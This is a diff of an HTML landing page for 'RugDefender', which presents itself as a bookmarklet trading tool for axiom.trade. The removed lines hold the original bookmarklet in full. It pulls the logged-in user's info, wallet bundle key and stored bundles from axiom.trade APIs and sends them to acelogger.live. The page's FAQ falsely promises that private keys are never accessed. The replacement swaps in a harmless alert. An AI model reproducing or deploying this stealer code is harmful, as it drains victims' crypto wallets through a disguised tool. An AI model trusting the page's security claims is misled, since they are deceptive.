@@ -1,433 +1,363 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rugdefender</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rugdefender</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: url('https://i.postimg.cc/QxNRx7Hf/Rugdefender-background-1.jpg') center center / cover no-repeat;
-            color: #ffffff;
-            min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
-        }
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
 
-        .background-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 1;
-        }
+body {
+    font-family: Inter, sans-serif;
+    background: url('https://i.postimg.cc/QxNRx7Hf/Rugdefender-background-1.jpg') center / cover no-repeat;
+    color: #ffffff;
+    min-height: 100vh;
+    position: relative;
+}
 
-        .container {
-            position: relative;
-            z-index: 2;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
+.background-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(0,0,0,0.7);
+    z-index: 1;
+}
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-        }
+.container {
+    position: relative;
+    z-index: 2;
+    max-width: 1200px;
+    margin: auto;
+    padding: 0 20px;
+}
 
-        .logo {
-            font-size: 24px;
-            font-weight: 800;
-            color: #ffffff;
-        }
+.header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 24px 0;
+}
 
-        .logo .highlight {
-            color: #ffffff;
-        }
+.logo {
+    font-size: 24px;
+    font-weight: 800;
+}
 
-        .header-buttons {
-            display: flex;
-            gap: 12px;
-        }
+.logo .highlight {
+    color: #ffffff;
+}
 
-        .btn-secondary {
-            padding: 10px 20px;
-            background: #333333;
-            color: #ffffff;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            position: relative;
-        }
+.header-buttons {
+    display: flex;
+    gap: 12px;
+}
 
-        .btn-secondary:hover {
-            background: #555555;
-        }
+.btn-secondary,
+.btn-primary {
+    padding: 10px 20px;
+    background: #444;
+    color: #fff;
+    text-decoration: none;
+    font-weight: 600;
+}
 
-        .btn-primary {
-            padding: 10px 20px;
-            background: #ffffff;
-            color: #000000;
-            text-decoration: none;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            position: relative;
-        }
+.btn-primary {
+    background: #fff;
+    color: #000;
+}
 
-        .btn-primary:hover {
-            background: #dddddd;
-        }
+.btn-secondary:hover {
+    background: #666;
+}
 
-        .main-content {
-            text-align: center;
-            padding: 80px 0 120px;
-        }
+.btn-primary:hover {
+    background: #ddd;
+}
 
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #444444;
-            color: #ffffff;
-            margin-bottom: 40px;
-            padding: 8px 16px;
-        }
+.main-content {
+    text-align: center;
+    padding: 80px 0 120px;
+}
 
-        .star-icon {
-            color: #ffffff;
-            font-size: 16px;
-        }
+.badge {
+    display: inline-flex;
+    gap: 8px;
+    padding: 8px 16px;
+    background: #333;
+    margin-bottom: 40px;
+}
 
-        .main-title {
-            font-size: clamp(2.5rem, 5vw, 4rem);
-            font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 30px;
-            color: #ffffff;
-        }
+.star-icon {
+    color: #fff;
+}
 
-        .main-title .highlight {
-            color: #ffffff;
-        }
+.main-title {
+    font-size: clamp(2.5rem, 5vw, 4rem);
+    font-weight: 800;
+    margin-bottom: 30px;
+}
 
-        .main-description {
-            font-size: 18px;
-            line-height: 1.6;
-            color: #dddddd;
-            max-width: 600px;
-            margin: 0 auto 40px;
-        }
+.main-title .highlight {
+    color: #fff;
+}
 
-        .instructions {
-            font-size: 16px;
-            line-height: 1.6;
-            color: #cccccc;
-            max-width: 500px;
-            margin: 0 auto 50px;
-        }
+.main-description {
+    font-size: 18px;
+    color: #ccc;
+    max-width: 600px;
+    margin: 0 auto 40px;
+}
 
-        .bookmarklet-container {
-            margin: 40px 0;
-        }
+.bookmarklet-container {
+    margin: 40px 0;
+}
 
-        .bookmarklet {
-            display: inline-block;
-            padding: 16px 32px;
-            background: #555555;
-            color: #ffffff;
-            text-decoration: none;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 18px;
-            transition: all 0.3s ease;
-            cursor: grab;
-            position: relative;
-        }
+.bookmarklet {
+    padding: 16px 32px;
+    background: #555;
+    color: #fff;
+    font-weight: 700;
+    text-decoration: none;
+    cursor: grab;
+}
 
-        .bookmarklet:hover {
-            background: #777777;
-        }
+.bookmarklet:hover {
+    background: #777;
+}
 
-        .footer-note {
-            font-size: 14px;
-            color: #bbbbbb;
-            margin-top: 40px;
-        }
+.footer-note {
+    font-size: 14px;
+    color: #aaa;
+    margin-top: 40px;
+}
 
-        .admin-link .admin-btn {
-            background: #444444;
-            color: #ffffff;
-        }
+.instructions-section {
+    margin-top: 250px;
+    text-align: center;
+    opacity: 0;
+    transform: translateY(40px);
+    transition: 0.6s;
+}
 
-        .instructions-section .instructions-title {
-            color: #ffffff;
-        }
+.instructions-section.visible {
+    opacity: 1;
+    transform: translateY(0);
+}
 
-        .instructions-section .instructions-subtitle {
-            color: #cccccc;
-        }
+.instructions-title {
+    font-size: 48px;
+    font-weight: 800;
+}
 
-        .step-number {
-            background: #666666;
-            color: #ffffff;
-        }
+.instructions-subtitle {
+    color: #ccc;
+    margin: 16px auto 60px;
+    max-width: 500px;
+}
 
-        .step-title {
-            color: #ffffff;
-        }
+.steps-container {
+    display: grid;
+    grid-template-columns: repeat(auto-fit,minmax(300px,1fr));
+    gap: 40px;
+}
 
-        .step-description {
-            color: #cccccc;
-        }
+.step {
+    opacity: 0;
+    transform: translateY(30px);
+    transition: 0.6s;
+}
 
-        .faq-title {
-            color: #ffffff;
-        }
+.step.visible {
+    opacity: 1;
+    transform: translateY(0);
+}
 
-        .faq-item {
-            background: #333333;
-        }
+.step-number {
+    width: 60px;
+    height: 60px;
+    background: #666;
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    margin: auto auto 24px;
+}
 
-        .faq-question {
-            color: #ffffff;
-        }
+.step-title {
+    font-size: 20px;
+    font-weight: 700;
+}
 
-        .faq-question:hover {
-            color: #ffffff;
-        }
+.step-description {
+    color: #ccc;
+}
 
-        .faq-icon {
-            color: #ffffff;
-        }
+.faq-section {
+    margin-top: 220px;
+    text-align: center;
+    max-width: 800px;
+    margin-inline: auto;
+    opacity: 0;
+    transform: translateY(40px);
+    transition: 0.6s;
+}
 
-        .faq-answer p {
-            color: #cccccc;
-        }
+.faq-section.visible {
+    opacity: 1;
+    transform: translateY(0);
+}
 
-        @media (max-width: 768px) {
-            .faq-title {
-                color: #ffffff;
-            }
+.faq-title {
+    font-size: 48px;
+    margin-bottom: 60px;
+}
 
-            .faq-question {
-                color: #ffffff;
-            }
+.faq-container {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+}
 
-            .faq-answer p {
-                color: #cccccc;
-            }
-        }
-    </style>
+.faq-item {
+    background: #222;
+}
+
+.faq-question {
+    width: 100%;
+    padding: 24px;
+    background: none;
+    border: none;
+    color: #fff;
+    font-size: 18px;
+    font-weight: 600;
+    display: flex;
+    justify-content: space-between;
+    cursor: pointer;
+}
+
+.faq-icon {
+    font-size: 24px;
+}
+
+.faq-answer {
+    max-height: 0;
+    overflow: hidden;
+    padding: 0 24px;
+    transition: 0.3s;
+}
+
+.faq-item.active .faq-answer {
+    max-height: 200px;
+    padding-bottom: 24px;
+}
+
+.faq-answer p {
+    color: #ccc;
+}
+</style>
 </head>
+
 <body>
-    <div class="background-overlay"></div>
+<div class="background-overlay"></div>
 
-    <div class="container">
-        <header class="header">
-            <div class="logo">
-                Rug<span class="highlight">Defender</span>
-            </div>
-            <div class="header-buttons">
-                <a href="#instructions" class="btn-secondary" onclick="scrollToInstructions(event)">Instructions</a>
-                <a href="#" class="btn-primary" id="activateBtn">Activate</a>
-            </div>
-        </header>
+<div class="container">
+<header class="header">
+<div class="logo">Rug<span class="highlight">Defender</span></div>
+<div class="header-buttons">
+<a href="#instructions" class="btn-secondary" onclick="scrollToInstructions(event)">Instructions</a>
+<a href="#" class="btn-primary" id="activateBtn">Activate</a>
+</div>
+</header>
 
-        <main class="main-content">
-            <div class="badge">
-                <span class="star-icon">⭐</span>
-                Your Unfair Advantage in Crypto
-            </div>
+<main class="main-content">
+<div class="badge"><span class="star-icon">⭐</span>Your Unfair Advantage in Crypto</div>
 
-            <h1 class="main-title">
-                The fastest way to<br>
-                <span class="highlight">dominate</span> axiom.trade
-            </h1>
+<h1 class="main-title">The fastest way to<br><span class="highlight">dominate</span> axiom.trade</h1>
 
-            <p class="main-description">
-                Advanced trading tools that give you an edge on axiom.trade. Monitor influencers, track wallets, automate buys, and never miss opportunities again.
-            </p>
+<p class="main-description">
+Advanced trading tools that give you an edge on axiom.trade.
+</p>
 
-            <div class="bookmarklet-container">
-                <a href="#" class="bookmarklet" id="bookmarklet" draggable="true">
-                    Activate
-                </a>
-            </div>
+<div class="bookmarklet-container">
+<a href="#" class="bookmarklet" id="bookmarklet" draggable="true">Activate</a>
+</div>
 
-            <p class="footer-note">
-                no installation • works in browser • completely secure
-            </p>
+<p class="footer-note">no installation • works in browser • completely secure</p>
 
-            <div class="instructions-section" id="instructions">
-                <h2 class="instructions-title">Get started in 30 seconds</h2>
-                <p class="instructions-subtitle">No complex setup. No wallet connections. Just drag and trade.</p>
+<div class="instructions-section" id="instructions">
+<h2 class="instructions-title">Get started in 30 seconds</h2>
+<p class="instructions-subtitle">No setup. Just drag and trade.</p>
 
-                <div class="steps-container">
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <div class="step-content">
-                            <h3 class="step-title">Drag to Install</h3>
-                            <p class="step-description">Drag the button above to your browser's bookmarks bar</p>
-                        </div>
-                    </div>
+<div class="steps-container">
+<div class="step">
+<div class="step-number">1</div>
+<h3 class="step-title">Drag to Install</h3>
+<p class="step-description">Drag button to bookmarks bar</p>
+</div>
 
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <div class="step-content">
-                            <h3 class="step-title">Activate on Axiom.trade</h3>
-                            <p class="step-description">Visit axiom.trade and click your bookmark to activate the tool</p>
-                        </div>
-                    </div>
+<div class="step">
+<div class="step-number">2</div>
+<h3 class="step-title">Activate</h3>
+<p class="step-description">Click bookmark on axiom.trade</p>
+</div>
 
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <div class="step-content">
-                            <h3 class="step-title">Start Trading</h3>
-                            <p class="step-description">Configure your settings or use defaults and start sniping</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
+<div class="step">
+<div class="step-number">3</div>
+<h3 class="step-title">Trade</h3>
+<p class="step-description">Start sniping</p>
+</div>
+</div>
+</div>
 
-            <div class="faq-section">
-                <h2 class="faq-title">Frequently asked questions</h2>
+<div class="faq-section">
+<h2 class="faq-title">Frequently asked questions</h2>
 
-                <div class="faq-container">
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>What's the difference between Free and Pro plans?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>The Free plan gives you basic access to our trading tools with limited features. The Pro plan unlocks advanced features like automated trading, priority alerts, custom strategies, and unlimited wallet monitoring.</p>
-                        </div>
-                    </div>
+<div class="faq-container">
+<div class="faq-item">
+<button class="faq-question" onclick="toggleFAQ(this)">
+<span>Free vs Pro?</span><span class="faq-icon">+</span>
+</button>
+<div class="faq-answer"><p>Pro unlocks advanced features.</p></div>
+</div>
 
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Is this secure? Do you access my wallet?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Absolutely secure. We only read public data from axiom.trade - we never access your private keys or control your wallet. All data is encrypted and processed locally in your browser.</p>
-                        </div>
-                    </div>
+<div class="faq-item">
+<button class="faq-question" onclick="toggleFAQ(this)">
+<span>Is it secure?</span><span class="faq-icon">+</span>
+</button>
+<div class="faq-answer"><p>No wallet access. Ever.</p></div>
+</div>
+</div>
+</div>
+</main>
+</div>
 
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Is the Pro plan worth 1 SOL?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Most users recover the Pro plan cost within their first successful trade. With advanced features like automated sniping and priority alerts, you'll never miss profitable opportunities again.</p>
-                        </div>
-                    </div>
+<script>
+const bookmarkletCode = `javascript:(()=>alert('bookmarklet'))()`;
+document.getElementById('bookmarklet').href = bookmarkletCode;
+document.getElementById('activateBtn').href = bookmarkletCode;
 
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Can I upgrade from Free to Pro anytime?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Yes! You can upgrade to Pro at any time from your dashboard. All your existing data and configurations will be preserved.</p>
-                        </div>
-                    </div>
+function toggleFAQ(btn){
+const item=btn.parentElement;
+document.querySelectorAll('.faq-item').forEach(i=>i.classList.remove('active'));
+item.classList.toggle('active');
+}
 
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Can I really beat other bots?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Our advanced algorithms and direct integration with axiom.trade give you a significant speed advantage. Many users report 70%+ success rates on their trades.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </main>
-    </div>
+function scrollToInstructions(e){
+e.preventDefault();
+document.getElementById('instructions').scrollIntoView({behavior:'smooth'});
+}
 
-    <script>
-        const bookmarkletCode = `javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()`;
-
-        const bookmarkletEl = document.getElementById('bookmarklet');
-        const activateBtn = document.getElementById('activateBtn');
-
-        bookmarkletEl.href = bookmarkletCode;
-        activateBtn.href = bookmarkletCode;
-
-        bookmarkletEl.addEventListener('dragstart', function(e) {
-            e.dataTransfer.setData('text/uri-list', bookmarkletCode);
-            e.dataTransfer.setData('text/plain', bookmarkletCode);
-        });
-
-        bookmarkletEl.addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Drag this button to your bookmarks bar instead of clicking it!');
-        });
-
-        activateBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Drag the "Activate" button below to your bookmarks bar to install the bookmarklet!');
-        });
-
-        function scrollToInstructions(event) {
-            event.preventDefault();
-            document.getElementById('instructions').scrollIntoView({
-                behavior: 'smooth',
-                block: 'start'
-            });
-        }
-
-        function toggleFAQ(button) {
-            const faqItem = button.parentElement;
-            const isActive = faqItem.classList.contains('active');
-
-            document.querySelectorAll('.faq-item').forEach(item => {
-                item.classList.remove('active');
-            });
-
-            if (!isActive) {
-                faqItem.classList.add('active');
-            }
-        }
-
-        function initScrollAnimations() {
-            const observer = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('visible');
-                    }
-                });
-            }, {
-                threshold: 0.1,
-                rootMargin: '0px 0px -50px 0px'
-            });
-
-            const instructionsSection = document.getElementById('instructions');
-            const faqSection = document.querySelector('.faq-section');
-            const steps = document.querySelectorAll('.step');
-
-            if (instructionsSection) observer.observe(instructionsSection);
-            if (faqSection) observer.observe(faqSection);
-
-            steps.forEach(step => {
-                observer.observe(step);
-            });
-        }
-
-        document.addEventListener('DOMContentLoaded', initScrollAnimations);
-    </script>
+const observer=new IntersectionObserver(entries=>{
+entries.forEach(e=>e.isIntersecting&&e.target.classList.add('visible'));
+});
+document.querySelectorAll('.instructions-section,.faq-section,.step').forEach(el=>observer.observe(el));
+</script>
 </body>
 </html>
